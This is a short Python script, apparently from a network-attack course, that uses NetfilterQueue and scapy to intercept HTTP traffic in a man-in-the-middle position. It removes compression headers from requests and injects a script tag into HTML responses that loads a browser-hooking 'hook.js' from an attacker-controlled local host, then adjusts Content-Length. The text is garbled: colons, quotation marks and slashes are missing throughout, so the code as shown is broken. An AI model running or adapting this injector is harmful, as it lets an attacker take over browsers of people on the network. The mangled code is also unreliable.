#!usrbinenv python
from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import re


def set_load(packet, load)
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet)
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw)
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80
            print(HTTP request)
            load = re.sub(Accept-Encoding.rn, , load)

        elif scapy_packet[scapy.TCP].sport == 80
            print(HTTP Response)
            # print(scapy_packet.show())
            injection_code = 'script src=http10.0.2.153000hook.jsscript'
            load = load.replace(body, injection_code + body)
            content_length_search = re.search((Content-Lengths)(d), load)
            if content_length_search and texthtml in load
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = NetfilterQueue()
queue.bind(1, process_packet)
queue.run()
